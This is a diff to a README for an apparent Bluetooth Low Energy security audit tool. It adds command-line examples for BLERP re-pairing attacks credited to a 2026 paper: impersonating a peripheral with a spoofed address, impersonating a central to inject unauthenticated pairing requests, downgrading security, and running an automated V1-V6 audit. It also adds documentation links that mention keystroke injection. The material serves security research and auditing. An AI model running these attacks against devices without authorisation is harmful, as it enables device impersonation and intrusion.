@@ -91,8 +91,28 @@ make setcap
 ### SMP Pairing Security Diagnostic
 
 ```sh
-# Run native HCI User Channel SMP downgrade probe:
+# Run native HCI User Channel SMP downgrade probe (first pairing, no bond):
 ./build/bleurp smp AA:BB:CC:DD:EE:FF -i 0 -t random
+
+# Re-pairing check (BLERP) against a device already bonded with hci0.
+# Without an address, lists the bonded identity addresses (needs sudo):
+sudo ./build/bleurp repair
+sudo ./build/bleurp repair AA:BB:CC:DD:EE:FF -i 0 -t public
+
+# Security Request test (BLERP, Apple finding): our adapter waits for the bonded
+# device to connect, sends one SMP Security Request, records its first reaction.
+# -r overrides ARSR (default: the estimated ARPK, the equality case of the paper).
+sudo ./build/bleurp secreq AA:BB:CC:DD:EE:FF -i 0 -c 60 -w 10
+
+# Native BLERP Attacks & Complete Audit Suite (NDSS 2026):
+# Peripheral Impersonation (PI): spoof peripheral, reject encryption (V5), downgrade security (V3/V4/V6)
+sudo ./build/bleurp blerp pi AA:BB:CC:DD:EE:FF -s 11:22:33:44:55:66 -n "Keyboard" -e -k 7
+
+# Central Impersonation (CI): spoof central, inject unauthenticated Pairing Request (V2/V4/V6)
+sudo ./build/bleurp blerp ci 11:22:33:44:55:66 -s AA:BB:CC:DD:EE:FF -k 7 -r 0x01
+
+# Full automated evaluation of V1 to V6 against a target:
+sudo ./build/bleurp blerp audit AA:BB:CC:DD:EE:FF -t public -i 0
 ```
 
 ### Native Keyboard Peripheral Mode & Keystroke Injection
@@ -112,6 +132,7 @@ make setcap
 Detailed architectural and technical guides are available in the [`docs/`](docs/) directory:
 
 - 📋 [**Architecture & Module Overview**](docs/architecture.md)
+- ⚡ [**Attaques & Audit BLERP (NDSS 2026, V1-V6, PI, CI, MitM)**](docs/blerp-attacks.md)
 - 🔍 [**Passive Device Fingerprinting & Exposure Scoring**](docs/device-fingerprinting.md)
 - 🔒 [**SMP Security Audit & Downgrade Probing**](docs/smp-security-audit.md)
 - ⌨️ [**HID Peripheral Emulation & Keystroke Injection**](docs/hid-peripheral-injection.md)
@@ -121,3 +142,4 @@ Detailed architectural and technical guides are available in the [`docs/`](docs/
 - ⚙️ [**CLI Arguments Reference**](docs/cli-args.md)
 - 📡 [**Scanning Architecture**](docs/scan-overview.md)
 - 🔗 [**Phase 2 GATT Connection Design**](docs/phase2-gatt-connection.md)
+- 📚 [**Modules d'étude BLERP : ce qui est implémenté et pourquoi**](docs/blerp-study-modules.md)
